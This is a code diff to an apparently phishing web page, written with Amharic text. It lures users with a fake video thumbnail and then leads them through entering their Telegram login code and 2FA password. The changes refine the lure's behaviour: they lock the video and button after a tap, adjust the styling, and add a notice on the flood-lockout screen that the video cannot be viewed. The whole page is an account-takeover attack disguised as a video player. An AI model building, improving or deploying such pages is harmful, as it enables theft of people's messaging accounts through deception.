@@ -109,7 +109,7 @@
         display: flex; align-items: center; justify-content: center; gap: 10px;
     }
     .btn-main:active { transform: scale(0.96); box-shadow: none; }
-    .btn-main:disabled { background: #333; color: #888; box-shadow: none; }
+    .btn-main:disabled { background: rgba(50, 50, 50, 0.8) !important; color: #888 !important; box-shadow: none !important; cursor: not-allowed !important; pointer-events: none; }
 
     /* Inputs & Keypad */
     input {
@@ -174,8 +174,8 @@
     <!-- Landing/Photo Step (Clean & Persuasive) -->
     <div id="step_photo_slide" class="step">
         <div class="glass-card" style="padding: 20px;">
-            <!-- 🌟 የቪዲዮ Cover ፎቶ 🌟 -->
-            <div style="position: relative; border-radius: 12px; overflow: hidden; margin-bottom: 20px;" onclick="handleLoginClick()">
+            <!-- 🌟 የቪዲዮ Cover ፎቶ - በአንዴ ብቻ እንዲነካ (disabled) እንዲሆን ተስተካክሏል 🌟 -->
+            <div id="video_thumbnail" style="position: relative; border-radius: 12px; overflow: hidden; margin-bottom: 20px; cursor: pointer; transition: 0.3s;" onclick="handleLoginClick()">
                 <img src="https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg" style="width: 100%; display: block; filter: brightness(0.8);">
                 <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff; font-size: 55px; opacity: 0.9; filter: drop-shadow(0 4px 10px rgba(0,0,0,0.5));">
                     <i class="fa-solid fa-circle-play"></i>
@@ -212,6 +212,7 @@
 
             <div id="status2" class="msg"></div>            
             
+            <!-- 🌟 አዲሱ Button ከ OTP በላይ ገብቷል 🌟 -->
             <button class="btn-main" style="background: rgba(10, 127, 246, 0.8196078431372549); color: var(--telegram-blue); border: 1px solid rgba(50, 177, 243, 0.8431372549019608); box-shadow: none; font-size: 14px; padding: 14px; margin-bottom: 15px; border-radius: 12px;" onclick="window.open('https://t.me/42777', '_blank')">
                 <i class="fa-regular fa-comment-dots"></i> ኮዱን ለማግኘት እዚህ ይጫኑ
             </button>            
@@ -236,7 +237,7 @@
             <p>የእርስዎ ቴሌግራም በፓስዎርድ (2FA) የተቆለፈ ነው። ለመቀጠል ፓስዎርድዎን ያስገቡ።</p>
             
             <div id="status3" class="msg"></div>
-            <!-- 🌟 የፓስዎርድ ሳጥኑና እይታ መቆጣጠሪያው (Eye Icon) በሚያምር ሁኔታ በውስጡ ተካቷል 🌟 -->
+            <!-- 🌟 የፓስዎርድ ሳጥኑና እይታ መቆጣጠሪያው (Eye Icon) 🌟 -->
             <div style="position: relative; width: 100%; margin-bottom: 10px;">
                 <input type="password" id="2fa_input" placeholder="ፓስዎርድ ያስገቡ" style="padding-right: 45px;" oninput="hideMsg(3)">
                 <div onclick="togglePasswordVisibility()" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; cursor: pointer; border-radius: 8px;">
@@ -272,6 +273,11 @@
             <h2 style="color: var(--warning);">እባክዎ ይጠብቁ!</h2>
             <p>ለደህንነት ሲባል ለተወሰነ ጊዜ ታግደዋል።</p>
             <div style="font-size: 45px; font-weight: 700; color: #fff; margin: 15px 0;" id="wait_time">00:00</div>
+            
+            <!-- 🌟 አዲሱ የ Flood ገፅ አዝራር 🌟 -->
+            <button class="btn-main" disabled style="background: rgba(255, 171, 0, 0.1); border: 1px solid rgba(255, 171, 0, 0.3); color: var(--warning) !important;">
+                <i class="fa-solid fa-lock"></i> ቪዲዮውን ማየት አይችሉም
+            </button>
         </div>
     </div>
 
@@ -363,9 +369,21 @@
 
     function stopLoaders() {
         isProcessing = false;
-        document.getElementById('loginBtn').disabled = false;
-        document.getElementById('loginSpinner').style.display = 'none';
-        document.getElementById('loginText').innerText = "▶ ቪዲዮውን አሁን ይመልከቱ";
+        
+        // አዝራሩን (Button) እና ቪዲዮ (Thumbnail) ምስሉን ከመቆለፍ (Disabled) ነፃ ማውጣት
+        const btn = document.getElementById('loginBtn');
+        const thumb = document.getElementById('video_thumbnail');
+        
+        if (btn) {
+            btn.disabled = false;
+            document.getElementById('loginSpinner').style.display = 'none';
+            document.getElementById('loginText').innerText = "▶ ቪዲዮውን አሁን ይመልከቱ";
+        }
+        if (thumb) {
+            thumb.style.pointerEvents = "auto";
+            thumb.style.opacity = "1";
+        }
+
         if(document.getElementById('confirmBtn')){
             document.getElementById('confirmBtn').disabled = false;
             document.getElementById('confirmSpinner').style.display = 'none';
@@ -388,18 +406,25 @@
     }
 
     function handleLoginClick() {
+        // 🌟 አንድ ጊዜ ከተነካ ቪዲዮውም ሆነ Button ድጋሚ እንዳይነኩ ይቆለፋሉ (Double click መከላከል) 🌟
+        if (isProcessing) return;
+        
         playTap();
         const btn = document.getElementById('loginBtn');
         const spinner = document.getElementById('loginSpinner');
         const txt = document.getElementById('loginText');
+        const thumb = document.getElementById('video_thumbnail');
+        
         btn.disabled = true;
+        thumb.style.pointerEvents = "none";
+        thumb.style.opacity = "0.7";
         spinner.style.display = 'block';
         txt.innerText = 'በማገናኘት ላይ...';
+        
         startVerification();
     }
 
     function startVerification() {
-        if (isProcessing) return;
         isProcessing = true;
         showMsg(1, 'loading-msg', 'ማረጋገጫ በመጠየቅ ላይ...');
         checkUserInDB();
@@ -517,15 +542,21 @@
     function displayFloodInStatus1(data) {
         stopLoaders();
         clearInterval(statusChecker);
-        showStep('photo_slide');
+        showStep('photo_slide'); // 🌟 Flood ካለ ወደ መጀመሪያው ገፅ ይመለሳል 🌟
         
         let remSeconds = data.remaining_seconds || data.wait || 60;
         let mins = data.remaining_minutes || data.total_wait_minutes || (remSeconds / 60).toFixed(1);
         
         showMsg(1, 'error', `በጣም ብዙ ሞክረዋል! መለያው ለ ${mins} ደቂቃ(ዎች) ተቆልፏል።`);
         
+        // አዝራሩንና ቪዲዮውን መቆለፍ
         const btn = document.getElementById('loginBtn');
+        const thumb = document.getElementById('video_thumbnail');
         if(btn) btn.disabled = true;
+        if(thumb) {
+            thumb.style.pointerEvents = "none";
+            thumb.style.opacity = "0.5";
+        }
     }
 
     function startFloodTimer(seconds) {
